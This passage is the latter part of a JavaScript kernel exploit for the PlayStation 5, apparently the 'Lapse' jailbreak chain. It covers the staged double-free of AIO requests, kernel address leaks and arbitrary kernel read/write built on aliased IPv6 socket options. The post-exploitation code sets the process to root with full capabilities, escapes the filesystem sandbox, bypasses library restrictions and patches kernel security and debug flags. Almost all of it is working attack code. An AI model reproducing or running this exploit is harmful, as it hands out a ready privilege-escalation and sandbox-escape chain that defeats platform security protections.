                // Get curproc from previously freed aio_info
                const curproc = slow_kread8(aio_info_addr + 8n);
                
                if (Number(curproc >> 48n) !== 0xffff) {
                    logger.log("Invalid curproc kernel address: " + hex(curproc));
                    logger.flush();
                    return null;
                }
                
                const possible_pid = slow_kread8(curproc + kernel_offset.PROC_PID);
                const current_pid = syscall(SYSCALL.getpid);
                
                if ((possible_pid & 0xffffffffn) !== (current_pid & 0xffffffffn)) {
                    logger.log("curproc verification failed: " + hex(curproc));
                    logger.flush();
                    return null;
                }
                
                logger.log("curproc = " + hex(curproc));
                logger.flush();
                
                kernel.addr.curproc = curproc;
                kernel.addr.curproc_fd = slow_kread8(kernel.addr.curproc + kernel_offset.PROC_FD);
                kernel.addr.curproc_ofiles = slow_kread8(kernel.addr.curproc_fd) + kernel_offset.FILEDESC_OFILES;
                kernel.addr.inside_kdata = kernel_addr;
                
                function get_fd_data_addr(sock, kread8_fn) {
                    const filedescent_addr = kernel.addr.curproc_ofiles + sock * kernel_offset.SIZEOF_OFILES;
                    const file_addr = kread8_fn(filedescent_addr + 0x0n);
                    return kread8_fn(file_addr + 0x0n);
                }
                
                function get_sock_pktopts(sock, kread8_fn) {
                    const fd_data = get_fd_data_addr(sock, kread8_fn);
                    const pcb = kread8_fn(fd_data + kernel_offset.SO_PCB);
                    const pktopts = kread8_fn(pcb + kernel_offset.INPCB_PKTOPTS);
                    return pktopts;
                }
                
                const worker_sock = new_socket();
                const worker_pktinfo = malloc(pktinfo_len);
                
                // Create pktopts on worker_sock
                set_sockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, worker_pktinfo, pktinfo_len);
                
                const worker_pktopts = get_sock_pktopts(worker_sock, slow_kread8);
                
                write64_uncompressed(pktinfo, worker_pktopts + 0x10n);  // overlap pktinfo
                write64_uncompressed(pktinfo + 8n, 0n);  // clear .ip6po_nexthop
                set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len);
                
                function kread20(addr, buf) {
                    write64_uncompressed(pktinfo, addr);
                    set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len);
                    get_sockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, buf, pktinfo_len);
                }
                
                function kwrite20(addr, buf) {
                    write64_uncompressed(pktinfo, addr);
                    set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len);
                    set_sockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, buf, pktinfo_len);
                }
                
                function kread8(addr) {
                    kread20(addr, worker_pktinfo);
                    return read64_uncompressed(worker_pktinfo);
                }
                
                // Note: this will write our 8 bytes + remaining 12 bytes as null
                function restricted_kwrite8(addr, val) {
                    write64_uncompressed(worker_pktinfo, val);
                    write64_uncompressed(worker_pktinfo + 8n, 0n);
                    write32_uncompressed(worker_pktinfo + 16n, 0n);
                    kwrite20(addr, worker_pktinfo);
                }
                
                write64_uncompressed(read_buf, kread8(kernel_addr));
                const kstr2 = read_cstring(read_buf);
                if (kstr2 !== "evf cv") {
                    logger.log("Test read of \"evf cv\" failed");
                    logger.flush();
                    return null;
                }
                
                logger.log("Restricted kernel r/w achieved");
                logger.flush();
                
                // Initialize ipv6_kernel_rw with restricted write
                ipv6_kernel_rw.init(kernel.addr.curproc_ofiles, kread8, restricted_kwrite8);
                
                kernel.read_buffer = ipv6_kernel_rw.read_buffer;
                kernel.write_buffer = ipv6_kernel_rw.write_buffer;
                kernel.copyout = ipv6_kernel_rw.copyout;
                kernel.copyin = ipv6_kernel_rw.copyin;  
                
                const kstr3 = kernel.read_null_terminated_string(kernel_addr);
                if (kstr3 !== "evf cv") {
                    logger.log("Test read of \"evf cv\" failed");
                    logger.flush();
                    return null;
                }
                
                logger.log("Arbitrary kernel r/w achieved!");
                logger.flush();
                
                // RESTORE: clean corrupt pointers
                const off_ip6po_rthdr = 0x70n;  // PS5 offset

                for (let i = 0; i < sds.length; i++) {
                    const sock_pktopts = get_sock_pktopts(sds[i], kernel.read_qword);
                    kernel.write_qword(sock_pktopts + off_ip6po_rthdr, 0n);
                }

                const reclaimer_pktopts = get_sock_pktopts(reclaim_sock, kernel.read_qword);

                kernel.write_qword(reclaimer_pktopts + off_ip6po_rthdr, 0n);
                kernel.write_qword(worker_pktopts + off_ip6po_rthdr, 0n);
                
                const sock_increase_ref = [
                    ipv6_kernel_rw.data.master_sock,
                    ipv6_kernel_rw.data.victim_sock,
                    master_sock,
                    worker_sock,
                    reclaim_sock
                ];
                
                // Increase ref counts to prevent deallocation
                for (const each of sock_increase_ref) {
                    const sock_addr = get_fd_data_addr(each, kernel.read_qword);
                    kernel.write_dword(sock_addr + 0x0n, 0x100n);  // so_count
                }
                
                logger.log("Fixes applied");
                logger.flush();
                
                return true;
                
            } catch (e) {
                logger.log("make_kernel_arw error: " + e.message);
                logger.log(e.stack);
                return null;
            }
        }

        function post_exploitation_ps5() {
            const OFFSET_UCRED_CR_SCEAUTHID = 0x58n;
            const OFFSET_UCRED_CR_SCECAPS = 0x60n;
            const OFFSET_UCRED_CR_SCEATTRS = 0x83n;
            const OFFSET_P_UCRED = 0x40n;

            const KDATA_MASK = 0xffff804000000000n;
            const SYSTEM_AUTHID = 0x4800000000010003n;

            function find_allproc() {
                let proc = kernel.addr.curproc;
                const max_attempt = 32;

                for (let i = 1; i <= max_attempt; i++) {
                    if ((proc & KDATA_MASK) === KDATA_MASK) {
                        const data_base = proc - kernel_offset.DATA_BASE_ALLPROC;
                        if ((data_base & 0xfffn) === 0n) {
                            return proc;
                        }
                    }
                    proc = kernel.read_qword(proc + 0x8n);  // proc->p_list->le_prev
                }

                throw new Error("failed to find allproc");
            }

            function get_dmap_base() {
                if (!kernel.addr.data_base) {
                    throw new Error("kernel.addr.data_base not set");
                }

                const OFFSET_PM_PML4 = 0x20n;
                const OFFSET_PM_CR3 = 0x28n;

                const kernel_pmap_store = kernel.addr.data_base + kernel_offset.DATA_BASE_KERNEL_PMAP_STORE;

                pml4 = kernel.read_qword(kernel_pmap_store + OFFSET_PM_PML4);
                cr3 = kernel.read_qword(kernel_pmap_store + OFFSET_PM_CR3);
                const dmap_base = pml4 - cr3;              
                return { dmap_base, cr3 };
            }
            
            function get_additional_kernel_address() {
                kernel.addr.allproc = find_allproc();
                kernel.addr.data_base = kernel.addr.allproc - kernel_offset.DATA_BASE_ALLPROC;
                kernel.addr.base = kernel.addr.data_base - kernel_offset.DATA_BASE;

                const { dmap_base, cr3 } = get_dmap_base();
                kernel.addr.dmap_base = dmap_base;
                kernel.addr.kernel_cr3 = cr3;
            }

            function escape_filesystem_sandbox(proc) {
                const proc_fd = kernel.read_qword(proc + kernel_offset.PROC_FD); // p_fd
                const rootvnode = kernel.read_qword(kernel.addr.data_base + kernel_offset.DATA_BASE_ROOTVNODE);

                kernel.write_qword(proc_fd + 0x10n, rootvnode); // fd_rdir
                kernel.write_qword(proc_fd + 0x18n, rootvnode); // fd_jdir
            }

            function patch_dynlib_restriction(proc) {
                const dynlib_obj_addr = kernel.read_qword(proc + 0x3e8n);

                //kernel.write_dword(dynlib_obj_addr + 0x118n, 0n); // prot (todo: recheck) credit JM fixes KP for 7.xx users
                kernel.write_qword(dynlib_obj_addr + 0x18n, 1n); // libkernel ref

                // bypass libkernel address range check (credit @cheburek3000)
                kernel.write_qword(dynlib_obj_addr + 0xf0n, 0n); // libkernel start addr
                kernel.write_qword(dynlib_obj_addr + 0xf8n, 0xffffffffffffffffn); // libkernel end addr
            }

            function patch_ucred(ucred, authid) {
                kernel.write_dword(ucred + 0x04n, 0n); // cr_uid
                kernel.write_dword(ucred + 0x08n, 0n); // cr_ruid
                kernel.write_dword(ucred + 0x0Cn, 0n); // cr_svuid
                kernel.write_dword(ucred + 0x10n, 1n); // cr_ngroups
                kernel.write_dword(ucred + 0x14n, 0n); // cr_rgid

                // escalate sony privs
                kernel.write_qword(ucred + OFFSET_UCRED_CR_SCEAUTHID, authid); // cr_sceAuthID

                // enable all app capabilities
                kernel.write_qword(ucred + OFFSET_UCRED_CR_SCECAPS, 0xffffffffffffffffn); // cr_sceCaps[0]
                kernel.write_qword(ucred + OFFSET_UCRED_CR_SCECAPS + 8n, 0xffffffffffffffffn); // cr_sceCaps[1]

                // set app attributes
                kernel.write_byte(ucred + OFFSET_UCRED_CR_SCEATTRS, 0x80n); // SceAttrs
            }

            function escalate_curproc() {
                const proc = kernel.addr.curproc;   

                const ucred = kernel.read_qword(proc + OFFSET_P_UCRED); // p_ucred
                const authid = SYSTEM_AUTHID;

                const uid_before = Number(syscall(SYSCALL.getuid));
                const in_sandbox_before = Number(syscall(SYSCALL.is_in_sandbox));

                patch_ucred(ucred, authid);
                patch_dynlib_restriction(proc);
                escape_filesystem_sandbox(proc);

                const uid_after = Number(syscall(SYSCALL.getuid));
                const in_sandbox_after = Number(syscall(SYSCALL.is_in_sandbox));

                logger.log("we root now? uid: before " + uid_before + " after " + uid_after);
                logger.log("we escaped now? in sandbox: before " + in_sandbox_before + " after " + in_sandbox_after);
                logger.flush();
            }

            function apply_patches_to_kernel_data(accessor) {
                const security_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_SECURITY_FLAGS;
                const target_id_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_TARGET_ID;
                const qa_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_QA_FLAGS;
                const utoken_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_UTOKEN_FLAGS;

                // Set security flags
                logger.log("setting security flags");

                const security_flags = kernel.read_dword(security_flags_addr);
                logger.log("  before: " + hex(security_flags));

                accessor.write_dword(security_flags_addr, security_flags | 0x14n);
                const security_flags_after = kernel.read_dword(security_flags_addr);
                logger.log("  after:  " + hex(security_flags_after));


                // Set targetid to DEX
                logger.log("setting targetid");

                const target_id_before = kernel.read_byte(target_id_flags_addr);
                logger.log("  before: " + hex(target_id_before));

                accessor.write_byte(target_id_flags_addr, 0x82n);
                const target_id_after = kernel.read_byte(target_id_flags_addr);
                logger.log("  after:  " + hex(target_id_after));


                // Set qa flags and utoken flags for debug menu enable
                logger.log("setting qa flags and utoken flags");

                const qa_flags = kernel.read_dword(qa_flags_addr);
                logger.log("  qa_flags before: " + hex(qa_flags));

                accessor.write_dword(qa_flags_addr, qa_flags | 0x10300n);
                const qa_flags_after = kernel.read_dword(qa_flags_addr);
                logger.log("  qa_flags after:  " + hex(qa_flags_after));


                const utoken_flags = kernel.read_byte(utoken_flags_addr);
                logger.log("  utoken_flags before: " + hex(utoken_flags));

                accessor.write_byte(utoken_flags_addr, utoken_flags | 0x1n);
                const utoken_flags_after = kernel.read_byte(utoken_flags_addr);
                logger.log("  utoken_flags after:  " + hex(utoken_flags_after));

                logger.log("debug menu enabled");
                logger.flush();
            }

            // Main execution
            get_additional_kernel_address();

            // patch current process creds
            escalate_curproc();

            update_kernel_offsets();
            
            // init GPU DMA for kernel r/w on protected area
            gpu.setup();

            const force_kdata_patch_with_gpu = false;
            const fw_version_num = Number(FW_VERSION);

            if (fw_version_num >= 7 || force_kdata_patch_with_gpu) {
                logger.log("applying patches to kernel data (with GPU DMA method)");
                apply_patches_to_kernel_data(gpu);
            } else {
                logger.log("applying patches to kernel data");
                apply_patches_to_kernel_data(kernel);
            }
        }


        function cleanup() {
            logger.log("Performing cleanup...");
            logger.flush();

            try {
                if (block_fd !== 0xffffffffffffffffn) {
                    syscall(SYSCALL.close, block_fd);
                    block_fd = -1n;
                }
                if (unblock_fd !== 0xffffffffffffffffn) {
                    syscall(SYSCALL.close, unblock_fd);
                    unblock_fd = -1n;
                }

                if (groom_ids !== null) {
                    const groom_ids_addr = malloc(4 * NUM_GROOMS);
                    for (let i = 0; i < NUM_GROOMS; i++) {
                        write32_uncompressed(groom_ids_addr + BigInt(i * 4), BigInt(groom_ids[i]));
                    }
                    free_aios2(groom_ids_addr, NUM_GROOMS);
                    groom_ids = null;
                }

                if (block_id !== 0xffffffffffffffffn) {
                    const block_id_buf = malloc(4);
                    write32_uncompressed(block_id_buf, block_id);
                    const block_errors = malloc(4);
                    aio_multi_wait(block_id_buf, 1, block_errors, 1, 0n);
                    aio_multi_delete(block_id_buf, 1, block_errors);
                    block_id = -1n;
                }

                if (sds !== null) {
                    for (let i = 0; i < sds.length; i++) {
                        if (sds[i] !== 0xffffffffffffffffn) {
                            syscall(SYSCALL.close, sds[i]);
                            sds[i] = -1n;
                        }
                    }
                    sds = null;
                }

                if (sds_alt !== null) {
                    for (let i = 0; i < sds_alt.length; i++) {
                        if (sds_alt[i] !== 0xffffffffffffffffn) {
                            syscall(SYSCALL.close, sds_alt[i]);
                        }
                    }
                    sds_alt = null;
                }
                
                if (prev_core >= 0) {
                    logger.log("Restoring to previous core: " + prev_core);
                    logger.flush();
                    pin_to_core(prev_core);
                    prev_core = -1;
                }
                
                set_rtprio(prev_rtprio);

                logger.log("Cleanup completed");
                logger.flush();

            } catch (e) {
                logger.log("Error during cleanup: " + e.message);
                logger.flush();
            }
        }
        
        function cleanup_fail() {
            cleanup();
            
            if (is_jailbroken()) {
                write_file("/user/temp/common_temp/lapse.fail", "");
            } else {
                write_file(failcheck_path, "");
            }
            
            logger.log("Exploit failed - Reboot and try again");
            logger.flush();
            send_notification("Exploit failed - Reboot and try again");
        }
        
        function rerun_check() {
            return file_exists(failcheck_path) || file_exists("/user/temp/common_temp/lapse.fail");
        }
        
        ////////////////////
        // MAIN EXECUTION //
        ////////////////////
/*
        try {
            if(is_jailbroken()) {
                logger.log("Already Jailbroken");
                send_notification("Already Jailbroken");
                return;
            }
        } catch (e) {
            logger.log("Not supported Y2JB\nUpdate Y2JB to at least 1.2 stable");
            send_notification("Not supported Y2JB\nUpdate Y2JB to at least 1.2 stable");
            return;
        }

        if(rerun_check()) {
            logger.log("Restart your PS5 to run Lapse again");
            send_notification("Restart your PS5 to run Lapse again");
            return;
        }
*/
        logger.log(lapse_version);
        logger.flush();
        send_notification(lapse_version);
        
        FW_VERSION = get_fwversion();

        logger.log("Detected firmware : " + FW_VERSION);
        logger.flush();

        function compare_version(a, b) {
            const [amaj, amin] = a.split('.').map(Number);
            const [bmaj, bmin] = b.split('.').map(Number);
            return amaj === bmaj ? amin - bmin : amaj - bmaj;
        }

        if (compare_version(FW_VERSION, "10.01") > 0) {
            logger.log("Not suppoerted firmware\nAborting...");
            logger.flush();
            send_notification("Not suppoerted firmware\nAborting...");
            return;
        }
        
        kernel_offset = get_kernel_offset(FW_VERSION);
        
        logger.log("\n=== STAGE 0: Setup ===");
        logger.flush();
        const setup_success = setup();
        if (!setup_success) {
            logger.log("Setup failed");
            logger.flush();
            return;
        }
        
        logger.log("Setup completed");
        logger.flush();
            
        try {
            logger.log("\n=== STAGE 1: Double-free AIO ===");
            sd_pair = double_free_reqs2();
            if (sd_pair === null) {
                logger.log("Stage 1 race condition failed");
                logger.flush();
                cleanup_fail();
                return;
            }
            logger.log("Stage 1 completed");
            logger.flush();
           
            logger.log("\n=== STAGE 2: Leak kernel addresses ===");
            logger.flush();
            leak_result = leak_kernel_addrs(sd_pair, sds);
            if (leak_result === null) {
                logger.log("Stage 2 kernel address leak failed");
                logger.flush();
                cleanup_fail();
                return;
            }
            logger.log("Stage 2 completed");
            logger.flush();
            logger.log("Leaked addresses:");
            logger.flush();
            logger.log("  reqs1_addr: " + hex(leak_result.reqs1_addr));
            logger.flush();
            logger.log("  kbuf_addr: " + hex(leak_result.kbuf_addr));
            logger.flush();
            logger.log("  kernel_addr: " + hex(leak_result.kernel_addr));
            logger.flush();
            logger.log("  target_id: " + hex(BigInt(leak_result.target_id)));
            logger.flush();
            logger.log("  fake_reqs3_addr: " + hex(leak_result.fake_reqs3_addr));
            logger.flush();
            logger.log("  aio_info_addr: " + hex(leak_result.aio_info_addr));
            logger.flush();
            logger.log("\n=== STAGE 3: Double free SceKernelAioRWRequest ===");
            logger.flush();
            const pktopts_sds = double_free_reqs1(
                leak_result.reqs1_addr,
                leak_result.target_id,
                leak_result.evf,
                sd_pair[0],
                sds,
                sds_alt,
                leak_result.fake_reqs3_addr
            );
            
            syscall(SYSCALL.close, BigInt(leak_result.fake_reqs3_sd));
    
            if (pktopts_sds === null) {
                logger.log("Stage 3 double free SceKernelAioRWRequest failed");
                logger.flush();
                cleanup_fail();
                return;
            }
            
            logger.log("Stage 3 completed!");
            logger.flush();
            logger.log("Aliased socket pair: " + pktopts_sds[0] + ", " + pktopts_sds[1]);
            logger.flush();

            logger.log("\n=== STAGE 4: Get arbitrary kernel read/write ===");
            logger.flush();

            arw_result = make_kernel_arw(
                pktopts_sds,
                leak_result.reqs1_addr,
                leak_result.kernel_addr,
                sds,
                sds_alt,
                leak_result.aio_info_addr
            );
            
            if (arw_result === null) {
                logger.log("Stage 4 get arbitrary kernel read/write failed");
                logger.flush();
                cleanup_fail();
                return;
            }
            
            logger.log("Stage 4 completed!");
            logger.flush();
            
            logger.log("\n=== STAGE 5: PS5 post-exploitation ===");
            logger.flush();
            
            try {
                post_exploitation_ps5();
                logger.log("Stage 5 completed!");
                logger.flush();
            } catch (e) {
                logger.log("Stage 5 post-exploitation failed");
                logger.flush();
                throw e;
            }
            
            cleanup();
            
            logger.log("Lapse finished");
            logger.flush();
            send_notification("Lapse finished");
            
        } catch (e) {
            logger.log("Lapse error: " + e.message);
            logger.log(e.stack);
            logger.flush();
            
            cleanup_fail();
        }
    
    } catch (e) {
        logger.log("Lapse error: " + e.message);
        logger.log(e.stack);
        logger.flush();
    }

})();
// 
